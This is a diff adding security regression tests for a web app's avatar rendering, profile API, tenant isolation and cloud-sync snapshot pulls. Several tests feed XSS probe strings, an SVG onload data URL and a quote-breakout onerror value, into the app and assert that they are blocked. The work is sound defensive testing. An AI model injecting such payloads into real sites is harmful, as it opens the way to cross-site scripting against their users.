+        !previewMarkup.includes('<svg') &&
+        previewCardEl.textContent.includes(xssPayloadEmail) &&
+        previewCardEl.textContent.includes(xssPayloadPass),
+        'XSS 16.1d: handleCreateSubUserSubmit preview card neutralizes HTML/JS via textContent'
+      );
+
+      // Profile & Avatar client XSS neutralization
+      authDom.sandbox.window.ForecasterAuth.updateAvatarPreview('data:image/svg+xml,<svg onload=alert(1)>', xssPayloadName);
+      const svgRejected = avatarPreviewEl.children.length === 0 && !avatarPreviewEl.innerHTML.includes('<img') && !avatarPreviewEl.innerHTML.includes('<svg');
+      authDom.sandbox.window.ForecasterAuth.updateAvatarPreview('" onerror="alert(1)', 'Test User');
+      const attrBreakRejected = avatarPreviewEl.children.length === 0 && !avatarPreviewEl.innerHTML.includes('onerror');
+      authDom.sandbox.window.ForecasterAuth.updateAvatarPreview('data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==', 'Safe User');
+      const pngAllowed = avatarPreviewEl.children.length === 1 && avatarPreviewEl.children[0].tagName === 'IMG' && avatarPreviewEl.children[0].src.startsWith('data:image/png;base64,');
+
+      authDom.sandbox.window.ForecasterAuth.updateUI();
+      assert(
+        svgRejected &&
+        attrBreakRejected &&
+        pngAllowed &&
+        !headerAvatarEl.innerHTML.includes('<img') &&
+        !dropdownAvatarEl.innerHTML.includes('<img') &&
+        !headerLabelEl.innerHTML.includes('<script') &&
+        !headerLabelEl.innerHTML.includes('<img') &&
+        dropdownNameEl.textContent.includes(xssPayloadName) &&
+        dropdownEmailEl.textContent.includes(xssPayloadEmail),
+        'XSS 16.1e: Profile & Avatar rendering blocks unsafe SVG/quote-breakout URLs and escapes name/role header labels via DOM nodes'
+      );
+
+      // 16.2 Server hardening: PUT /api/auth/profile avatar validation + POST /api/cloud-sync/transactions
+      const regA = await request(
+        '/api/auth/register',
+        { method: 'POST', body: JSON.stringify({ name: 'OrgA Owner', email: `orga_${Date.now()}@sec.local`, password: 'StrongOwner#2026!' }) },
+        p1123Srv.baseUrl
+      );
+      const regB = await request(
+        '/api/auth/register',
+        { method: 'POST', body: JSON.stringify({ name: 'OrgB Owner', email: `orgb_${Date.now()}@sec.local`, password: 'StrongOwner#2026!' }) },
+        p1123Srv.baseUrl
+      );
+      assert(regA.status === 201 && regB.status === 201, 'P1123 16.2a: Registered two isolated organizations');
+
+      const ownerAToken = regA.body.token;
+      const ownerAVault = regA.body.user.vaultId;
+      const ownerBToken = regB.body.token;
+      const ownerBVault = regB.body.user.vaultId;
+
+      const subMemberCreate = await request(
+        '/api/auth/sub-users',
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({ name: 'OrgA Member', email: `orga_mem_${Date.now()}@sec.local`, role: 'member' })
+        },
+        p1123Srv.baseUrl
+      );
+      const subMemLogin = await request(
+        '/api/auth/login',
+        { method: 'POST', body: JSON.stringify({ email: subMemberCreate.body.subUser.email, password: subMemberCreate.body.temporaryPassword }) },
+        p1123Srv.baseUrl
+      );
+      const memberAToken = subMemLogin.body.token;
+
+      // Server avatarUrl validation
+      const badSvgProfile = await request(
+        '/api/auth/profile',
+        {
+          method: 'PUT',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({ name: 'OrgA Owner', avatarUrl: 'data:image/svg+xml,<svg onload=alert(1)>' })
+        },
+        p1123Srv.baseUrl
+      );
+      const goodPngProfile = await request(
+        '/api/auth/profile',
+        {
+          method: 'PUT',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({ name: 'OrgA Owner', avatarUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==' })
+        },
+        p1123Srv.baseUrl
+      );
+      assert(
+        badSvgProfile.status === 400 && goodPngProfile.status === 200,
+        'P1123 16.2b: PUT /api/auth/profile rejects SVG/malicious avatarUrl (HTTP 400) while allowing valid PNG/preset avatars (HTTP 200)'
+      );
+
+      // Transaction schema validation & demo-seed filtering
+      const invalidMissingBody = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        { method: 'POST', headers: { Authorization: `Bearer ${ownerAToken}` }, body: JSON.stringify({}) },
+        p1123Srv.baseUrl
+      );
+      const invalidNegAmt = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({ transactions: [{ id: 'tx_bad_amt', amount: -50, type: 'expense', date: '2026-11-16' }] })
+        },
+        p1123Srv.baseUrl
+      );
+      const invalidType = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({ transactions: [{ id: 'tx_bad_type', amount: 50, type: 'transfer_hack', date: '2026-11-16' }] })
+        },
+        p1123Srv.baseUrl
+      );
+      assert(
+        invalidMissingBody.status === 400 && invalidNegAmt.status === 400 && invalidType.status === 400,
+        'P1123 16.2c: POST /api/cloud-sync/transactions enforces schema validation (rejects missing array, negative amounts, invalid types with HTTP 400)'
+      );
+
+      const seedPlusCleanPost = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({
+            transactions: [
+              { id: 'tx_init_1', amount: 9999, type: 'income', date: '2026-11-16', description: 'Seed Leak' },
+              { id: 'tx_owner_clean_1', amount: 250, type: 'income', date: '2026-11-16', description: 'Owner Clean Record' }
+            ]
+          })
+        },
+        p1123Srv.baseUrl
+      );
+      const postSeedIds = (seedPlusCleanPost.body?.transactions || []).map((t: any) => t.id);
+      assert(
+        seedPlusCleanPost.status === 200 &&
+        seedPlusCleanPost.body?.filteredDemoSeedCount === 1 &&
+        !postSeedIds.includes('tx_init_1') &&
+        postSeedIds.includes('tx_owner_clean_1'),
+        'P1123 16.2d: POST /api/cloud-sync/transactions strips DEMO_SEED_IDS (tx_init_1) from non-demo vaults while preserving valid transactions'
+      );
+
+      // Member append-only, idempotency & existing record tamper protection
+      const memberAppend = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${memberAToken}` },
+          body: JSON.stringify({
+            transactions: [{ id: 'tx_mem_append_1', amount: 120, type: 'expense', date: '2026-11-16', description: 'Fuel Receipt' }]
+          })
+        },
+        p1123Srv.baseUrl
+      );
+      const memberIdempotentRepost = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${memberAToken}` },
+          body: JSON.stringify({
+            // Same fields in different JSON property order -> must remain idempotent HTTP 200
+            transactions: [{ description: 'Fuel Receipt', date: '2026-11-16', type: 'expense', amount: 120, id: 'tx_mem_append_1' }]
+          })
+        },
+        p1123Srv.baseUrl
+      );
+      const memberOverwriteOwn = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${memberAToken}` },
+          body: JSON.stringify({
+            transactions: [{ id: 'tx_mem_append_1', amount: 999, type: 'expense', date: '2026-11-16', description: 'Tampered Amount' }]
+          })
+        },
+        p1123Srv.baseUrl
+      );
+      const memberOverwriteOwner = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${memberAToken}` },
+          body: JSON.stringify({
+            transactions: [{ id: 'tx_owner_clean_1', amount: 1, type: 'income', date: '2026-11-16', description: 'Overwritten Owner Txn' }]
+          })
+        },
+        p1123Srv.baseUrl
+      );
+      const vaultVerifyAfterMember = await request(
+        `/api/cloud-sync/vault/${encodeURIComponent(ownerAVault)}`,
+        { headers: { Authorization: `Bearer ${ownerAToken}` } },
+        p1123Srv.baseUrl
+      );
+      const verifiedTxns = vaultVerifyAfterMember.body?.vault?.transactions || [];
+      const preservedMem = verifiedTxns.find((t: any) => t.id === 'tx_mem_append_1');
+      const preservedOwner = verifiedTxns.find((t: any) => t.id === 'tx_owner_clean_1');
+
+      assert(
+        memberAppend.status === 200 &&
+        memberIdempotentRepost.status === 200 &&
+        memberIdempotentRepost.body?.count === 2 &&
+        memberOverwriteOwn.status === 403 &&
+        memberOverwriteOwner.status === 403 &&
+        preservedMem?.amount === 120 &&
+        preservedOwner?.amount === 250,
+        'P1123 16.2e: Member supports append-only + idempotent re-post (HTTP 200) while rejecting existing transaction modification (HTTP 403)'
+      );
+
+      // Owner CAN update existing transaction, while cross-tenant Owner B is blocked (403) and unauth is blocked (401)
+      const ownerUpdateRes = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${ownerAToken}` },
+          body: JSON.stringify({
+            transactions: [{ id: 'tx_owner_clean_1', amount: 300, type: 'income', date: '2026-11-16', description: 'Owner Updated Record' }]
+          })
+        },
+        p1123Srv.baseUrl
+      );
+      const crossTenantPost = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${ownerBToken}` },
+          body: JSON.stringify({ transactions: [{ id: 'tx_cross_b', amount: 10, type: 'expense', date: '2026-11-16' }] })
+        },
+        p1123Srv.baseUrl
+      );
+      const unauthTxnPost = await request(
+        `/api/cloud-sync/transactions?vaultId=${encodeURIComponent(ownerAVault)}`,
+        { method: 'POST', body: JSON.stringify({ transactions: [{ id: 'tx_anon', amount: 10, type: 'expense', date: '2026-11-16' }] }) },
+        p1123Srv.baseUrl
+      );
+      assert(
+        ownerUpdateRes.status === 200 && crossTenantPost.status === 403 && unauthTxnPost.status === 401,
+        'P1123 16.2f: Owner update allowed (HTTP 200), cross-tenant blocked (HTTP 403), unauthenticated blocked (HTTP 401)'
+      );
+
+      // 16.3 Execute real src/scripts/cloud-sync.js against live isolated backend for Admin Pull Cloud Snapshot
+      const localUnsavedTxns = [{ id: 'tx_local_unsaved_1', amount: 75, type: 'expense', date: '2026-11-16', description: 'Local Draft Before Pull' }];
+      const syncDom = createMockDomEnv({
+        pro_transactions: JSON.stringify(localUnsavedTxns),
+        forecaster_auth_user: JSON.stringify({ id: regA.body.user.id, vaultId: ownerAVault })
+      });
+      const recoverBtnMock = syncDom.getOrCreateEl('cloud-sync-recover-snapshot-btn', 'button');
+      recoverBtnMock.className = 'hidden px-3 py-1.5';
+
+      const requestedUrls: string[] = [];
+      syncDom.setFetch(async (url: string, opts?: any) => {
+        requestedUrls.push(String(url));
+        const res = await fetch(`${p1123Srv.baseUrl}${url}`, opts as any);
+        return res;
+      });
+      syncDom.sandbox.window.transactions = [...localUnsavedTxns];
+
+      const cloudSyncCode = fs.readFileSync(path.resolve(process.cwd(), 'src/scripts/cloud-sync.js'), 'utf-8');
+      vm.runInNewContext(cloudSyncCode, syncDom.sandbox);
+
+      // 16.3a Unauthenticated pull rejected without touching local state or calling /restore-history
+      const unauthPullOk = await syncDom.sandbox.window.ForecasterCloudSync.restoreHistory(true, { skipConfirm: true });
+      const localAfterUnauth = JSON.parse(syncDom.storage.get('pro_transactions') || '[]');
+      assert(
+        unauthPullOk === false &&
+        !requestedUrls.some(u => u.includes('restore-history')) &&
+        localAfterUnauth.length === 1 &&
+        localAfterUnauth[0].id === 'tx_local_unsaved_1',
+        'PullSnapshot 16.3a: Unauthenticated snapshot pull aborts safely without touching local data or hitting legacy 404 endpoint'
+      );
+
+      // 16.3b Cross-tenant pull (Owner B token trying Owner A vault) rejected with HTTP 403, preserving local workspace
+      syncDom.storage.set('forecaster_auth_token', ownerBToken);
+      const crossPullOk = await syncDom.sandbox.window.ForecasterCloudSync.restoreHistory(true, { vaultId: ownerAVault, skipConfirm: true });
+      const localAfterCross = JSON.parse(syncDom.storage.get('pro_transactions') || '[]');
+      assert(
+        crossPullOk === false &&
+        requestedUrls.some(u => u === `/api/cloud-sync/vault/${encodeURIComponent(ownerAVault)}`) &&
+        !requestedUrls.some(u => u.includes('restore-history')) &&
+        localAfterCross.length === 1 &&
+        localAfterCross[0].id === 'tx_local_unsaved_1',
+        'PullSnapshot 16.3b: Cross-tenant snapshot pull rejected via GET /api/cloud-sync/vault/:vaultId (HTTP 403) with local data preserved'
+      );
+
+      // 16.3c Confirmation Cancel aborts destructive pull cleanly
+      syncDom.storage.set('forecaster_auth_token', ownerAToken);
+      syncDom.setConfirm(false);
+      syncDom.resetConfirmCalls();
+      const cancelPullOk = await syncDom.sandbox.window.ForecasterCloudSync.restoreHistory(true);
+      const localAfterCancel = JSON.parse(syncDom.storage.get('pro_transactions') || '[]');
+      assert(
+        cancelPullOk === false &&
+        syncDom.getConfirmCalls() === 1 &&
+        localAfterCancel.length === 1 &&
+        localAfterCancel[0].id === 'tx_local_unsaved_1',
+        'PullSnapshot 16.3c: Cancelling confirmation prompt preserves local workspace without overwriting'
+      );
+
+      // 16.3d Confirmed Authorized Pull replaces workspace via GET /api/cloud-sync/vault/:vaultId,
+      // saves recoverable pre-pull local snapshot, reveals recover button, and restores pre-pull snapshot cleanly
+      syncDom.setConfirm(true);
+      const authPullOk = await syncDom.sandbox.window.ForecasterCloudSync.restoreHistory(true);
+      const pulledTxns = JSON.parse(syncDom.storage.get('pro_transactions') || '[]');
+      const savedSafetySnap = syncDom.sandbox.window.ForecasterCloudSync.getPrePullLocalSnapshot();
+      const recoverBtnVisible = !recoverBtnMock.classList.contains('hidden');
+
+      const restoredSnapOk = syncDom.sandbox.window.ForecasterCloudSync.restorePrePullLocalSnapshot(true, { skipConfirm: true });
+      const revertedLocalTxns = JSON.parse(syncDom.storage.get('pro_transactions') || '[]');
+
+      assert(
+        authPullOk === true &&
+        !requestedUrls.some(u => u.includes('restore-history')) &&
+        pulledTxns.some((t: any) => t.id === 'tx_owner_clean_1' && t.amount === 300) &&
+        !pulledTxns.some((t: any) => t.id === 'tx_local_unsaved_1') &&
+        !!savedSafetySnap &&
+        savedSafetySnap.data?.transactions?.[0]?.id === 'tx_local_unsaved_1' &&
+        recoverBtnVisible &&
+        restoredSnapOk === true &&
+        revertedLocalTxns.length === 1 &&
+        revertedLocalTxns[0].id === 'tx_local_unsaved_1',
+        'PullSnapshot 16.3d: Confirmed pull uses GET /api/cloud-sync/vault/:vaultId, creates recoverable local snapshot, and supports clean local rollback'
+      );
+
+      // Verify unauthenticated GET vault directly returns 401 and Owner B GET Owner A vault returns 403
+      const directUnauthVault = await request(`/api/cloud-sync/vault/${encodeURIComponent(ownerAVault)}`, {}, p1123Srv.baseUrl);
+      const directCrossVault = await request(
+        `/api/cloud-sync/vault/${encodeURIComponent(ownerAVault)}`,
+        { headers: { Authorization: `Bearer ${ownerBToken}` } },
+        p1123Srv.baseUrl
+      );
+      const directAuthVault = await request(
+        `/api/cloud-sync/vault/${encodeURIComponent(ownerAVault)}`,
+        { headers: { Authorization: `Bearer ${ownerAToken}` } },
+        p1123Srv.baseUrl
+      );
+      assert(
+        directUnauthVault.status === 401 &&
+        directCrossVault.status === 403 &&
+        directAuthVault.status === 200 &&
+        ownerBVault !== ownerAVault,
+        'PullSnapshot 16.3e: Vault read endpoint enforces HTTP 401 unauth, HTTP 403 cross-tenant, and HTTP 200 authorized pull'
+      );
+
+      // 16.4 Mirrored src/ and public/ file synchronization parity
+      const mirrorPairs: Array<[string, string]> = [
+        ['index.html', 'public/index.html'],
+        ['src/scripts/auth-manager.js', 'public/scripts/auth-manager.js'],
+        ['src/scripts/cloud-sync.js', 'public/scripts/cloud-sync.js']
+      ];
+      const mirrorMismatches = mirrorPairs.filter(([a, b]) => {
+        const aBuf = fs.readFileSync(path.resolve(process.cwd(), a));
+        const bBuf = fs.readFileSync(path.resolve(process.cwd(), b));
+        return !aBuf.equals(bBuf);
+      });
+      assert(
+        mirrorMismatches.length === 0,
+        'SyncParity 16.4: index.html and modified src/scripts/* files match public/ mirrors byte-for-byte',
+        mirrorMismatches.map(([a, b]) => `${a} !== ${b}`).join(', ')
+      );
+    } finally {
+      await p1123Srv.stop(true);
     }
 
     // 13.10 Hardcoded credential scan across runtime source & frontend assets
